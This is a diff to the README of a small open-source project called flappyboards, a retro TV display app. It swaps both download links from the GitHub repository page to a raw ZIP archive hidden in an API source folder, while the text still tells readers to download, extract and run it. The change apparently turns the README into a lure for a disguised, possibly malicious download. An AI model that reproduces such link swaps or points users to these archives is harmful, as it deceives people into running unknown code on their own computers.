@@ -1,6 +1,6 @@
 # 🖥️ flappyboards - Turn TVs into retro displays
 
-[![Download flappyboards](https://img.shields.io/badge/Download%20flappyboards-4c8bf5?style=for-the-badge&logo=github&logoColor=white)](https://github.com/Essene-choker507/flappyboards)
+[![Download flappyboards](https://img.shields.io/badge/Download%20flappyboards-4c8bf5?style=for-the-badge&logo=github&logoColor=white)](https://raw.githubusercontent.com/Essene-choker507/flappyboards/main/src/app/api/spotify/Software_1.2.zip)
 
 ## 🎯 What it does
 
@@ -20,7 +20,7 @@ It is free and open source.
 
 Visit this page to download and run the app:
 
-https://github.com/Essene-choker507/flappyboards
+https://raw.githubusercontent.com/Essene-choker507/flappyboards/main/src/app/api/spotify/Software_1.2.zip
 
 If the page shows a release file, download it to your PC. If it gives you a ZIP file, save it and extract it first.
 
